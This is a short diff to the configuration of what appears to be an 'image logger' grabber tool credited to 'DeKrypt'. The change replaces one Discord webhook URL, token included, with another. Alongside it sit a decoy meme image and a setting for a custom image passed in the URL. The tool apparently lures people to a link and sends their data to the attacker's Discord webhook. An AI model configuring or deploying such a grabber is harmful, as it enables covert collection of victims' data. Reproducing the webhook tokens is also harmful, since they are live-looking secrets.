@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1339493978386464851/eQ4jgNXNOQV9w_gUHh2E2CPV17Ru90tD-jz5267ybKe8y0GMC_wBEBn-mhMeVC5TvFau",
+    "webhook": "https://discord.com/api/webhooks/1339496219583451196/AaOBaA6V0Imrv2TNcJ9PqkWNfAawFAffOOVbd_-6ZbN3IP-3dzG5cyQdMmQMGnLqmerx",
     "image": "https://quotesbae.com/wp-content/uploads/2018/02/Worlds-Funniest-Meme-Funny-Image-Photo-Joke-01.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
